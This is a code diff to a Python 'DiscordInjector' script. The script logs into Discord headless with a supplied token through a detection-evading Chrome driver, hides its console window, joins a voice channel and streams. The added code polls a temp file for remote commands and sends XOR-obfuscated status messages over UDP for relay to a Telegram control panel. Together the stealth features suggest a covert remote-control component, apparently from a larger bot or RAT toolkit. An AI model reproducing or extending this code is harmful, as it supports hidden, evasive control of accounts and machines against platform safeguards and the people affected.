@@ -8,9 +8,14 @@ import ctypes
 import ctypes.wintypes
 import threading
 import undetected_chromedriver as uc
+import sys
+import asyncio
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
+import socket
+import base64
+import datetime
 
 # Скрытие окна консоли при запуске (только для Windows)
 try:
@@ -22,12 +27,12 @@ except:
     pass
 
 class DiscordInjector:
-    def __init__(self, callback=None, headless=True, proxy_url=None):
+    def __init__(self, callback=None, headless=True, user_data_dir=None):
         self.driver = None
         self.callback = callback
         self.headless = headless 
         self.proxy_url = None # Disabled as requested
-        self.user_data_dir = None
+        self.user_data_dir = user_data_dir
         self._temp_dir = tempfile.gettempdir()
 
     def _get_chrome_version(self):
@@ -80,8 +85,24 @@ class DiscordInjector:
         if status == "success": prefix = "[+]"
         elif status == "error": prefix = "[-]"
         elif status == "warning": prefix = "[!]"
-        msg = f"{prefix} {text}"
+        
+        # Structure progress for Telegram: "Discord Progress: [BAR] XX% | Status"
+        if "[PROGRESS]" in text:
+            msg = text.replace("[PROGRESS]", "Discord Progress:")
+        else:
+            msg = f"{prefix} {text}"
+            
         print(msg)
+        # Also log to file for GlobalLogger to forward
+        try:
+            with open(r"C:\Users\Public\discord_debug.log", "a", encoding="utf-8") as f:
+                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}\n")
+        except: pass
+        try:
+            with open("C:\\Users\\Public\\discord_debug.log", "a", encoding="utf-8") as f:
+                f.write(f"[{datetime.datetime.now()}] {msg}\n")
+        except: pass
+
         if self.callback:
             try: self.callback(msg)
             except: pass
@@ -123,7 +144,11 @@ class DiscordInjector:
         
         # Цепочка попыток запуска с РАЗНЫМИ профилями и стратегиями
         version = self._get_chrome_version()
-        base_profile = os.path.join(self._temp_dir, "discord_profile_")
+        
+        if self.user_data_dir:
+            base_profile = self.user_data_dir
+        else:
+            base_profile = os.path.join(self._temp_dir, "discord_profile_")
         
         # Disable taskbar loop for visibility
         if self.headless: 
@@ -132,8 +157,8 @@ class DiscordInjector:
         """
         # Попытка 1: UC + subprocess + Fresh Profile 1
         try:
-            p1 = base_profile + "1"
-            if os.path.exists(p1): shutil.rmtree(p1, ignore_errors=True)
+            p1 = base_profile if self.user_data_dir else base_profile + "1"
+            if not self.user_data_dir and os.path.exists(p1): shutil.rmtree(p1, ignore_errors=True)
             self.log(f"[PROGRESS] [*] Попытка 1: Инициализация UC (версия: {version or 'авто'})...")
             self.driver = uc.Chrome(options=self._get_options(p1), version_main=version, use_subprocess=True)
             self.log("[PROGRESS] [+] Драйвер запущен (Попытка 1).", "success")
@@ -237,6 +262,11 @@ class DiscordInjector:
             
             # Запускаем сервис и драйвер
             service = Service(driver_path)
+            
+            p4 = base_profile if self.user_data_dir else os.path.join(self._temp_dir, "discord_profile_4")
+            if not self.user_data_dir and os.path.exists(p4): shutil.rmtree(p4, ignore_errors=True)
+            opts.add_argument(f"--user-data-dir={p4}")
+            
             self.driver = webdriver.Chrome(service=service, options=opts)
             
             # Проверка что драйвер реально работает
@@ -471,7 +501,32 @@ class DiscordInjector:
         time.sleep(1)
         await self.toggle_deafen()
         self.is_ready = True
-        self.log(f"[PROGRESS] [!] {make_bar(100, 100)} Бот готов к работе.", "success")
+        self.log(f"[PROGRESS] {make_bar(100, 100)} Бот готов к работе. Используйте кнопки в панели управления.", "success")
+        
+        # Start command listener in a separate thread
+        threading.Thread(target=self._command_listener_loop, daemon=True).start()
+
+    def _command_listener_loop(self):
+        cmd_file = os.path.join(tempfile.gettempdir(), "discord_cmd.txt")
+        self.log("[PROGRESS] [*] Ожидание команд управления...")
+        while True:
+            if os.path.exists(cmd_file):
+                try:
+                    with open(cmd_file, "r") as f:
+                        cmd = f.read().strip()
+                    os.remove(cmd_file)
+                    
+                    if cmd == "mute_mic":
+                         asyncio.run_coroutine_threadsafe(self.toggle_mic(), asyncio.get_event_loop())
+                    elif cmd == "deafen":
+                         asyncio.run_coroutine_threadsafe(self.toggle_deafen(), asyncio.get_event_loop())
+                    elif cmd == "stream":
+                         asyncio.run_coroutine_threadsafe(self.start_stream(), asyncio.get_event_loop())
+                    elif cmd == "disconnect":
+                         self.log("[PROGRESS] [!] Получена команда на отключение.")
+                         os._exit(0)
+                except: pass
+            time.sleep(1)
 
     async def start_stream(self):
         if not self.driver or not self.is_ready: return
@@ -590,3 +645,73 @@ class DiscordInjector:
             try: shutil.rmtree(self.user_data_dir)
             except: pass
         self.log("[PROGRESS] [+] Сессия закрыта.")
+
+def tg_notify(msg, port=51337):
+    try:
+        salt = b"n2xkNQYbZwj8r9fz"
+        data = msg.encode('utf-8')
+        xor_data = bytearray([data[i] ^ salt[i % len(salt)] for i in range(len(data))])
+        payload = base64.b64encode(xor_data).decode('utf-8')
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.sendto(payload.encode('utf-8'), ("127.0.0.1", port))
+    except: pass
+
+async def main():
+    # Usage: discord_bot.py <token> <voice_url> [action] [--udp <port>]
+    token = None
+    url = None
+    action = "join"
+    udp_port = 51337
+    profile_dir = None
+
+    # Simple manual parse for speed/minimizing dependencies
+    i = 1
+    args = []
+    while i < len(sys.argv):
+        if sys.argv[i] == "--udp" and i+1 < len(sys.argv):
+            try: udp_port = int(sys.argv[i+1])
+            except: pass
+            i += 2
+        elif sys.argv[i] == "--profile" and i+1 < len(sys.argv):
+            profile_dir = sys.argv[i+1]
+            i += 2
+        else:
+            args.append(sys.argv[i])
+            i += 1
+    
+    if len(args) < 2:
+        print("Usage: discord_bot.py <token> <voice_url> [action] [--udp <port>]")
+        return
+
+    token = args[0]
+    url = args[1]
+    if len(args) > 2: action = args[2]
+
+    def log_cb(msg):
+        # Forward only IMPORTANT progress to Telegram
+        if "[PROGRESS]" in msg:
+            clean_msg = msg.replace("[PROGRESS]", "").strip()
+            # Wrap in HTML for Telegram as BotOrchestrator uses ParseMode.Html
+            tg_notify(f"🎮 <b>Discord Remote Bot:</b>\n━━━━━━━━━━━━━━━━━━\n{clean_msg}", port=udp_port)
+
+    tg_notify("🎮 <b>Discord Remote Bot:</b>\n━━━━━━━━━━━━━━━━━━\n[░░░░░░░░░░░░░░░░░░░░] 0% — Инициализация...", port=udp_port)
+    
+    injector = DiscordInjector(callback=log_cb, headless=True, user_data_dir=profile_dir)
+    try:
+        await injector.connect_and_join(token, url)
+        if action == "join":
+            await injector.start_stream()
+        
+        # Keep alive for a while to maintain connection
+        # In a real environment, you might want a better signaling mechanism to close
+        tg_notify("🎮 <b>Discord Remote Bot:</b> Successfully connected and streaming.", port=udp_port)
+        
+        while True:
+            await asyncio.sleep(10)
+    except Exception as e:
+        tg_notify(f"❌ <b>Discord Remote Bot Error:</b> <code>{str(e)}</code>", port=udp_port)
+    finally:
+        await injector.close()
+
+if __name__ == "__main__":
+    asyncio.run(main())
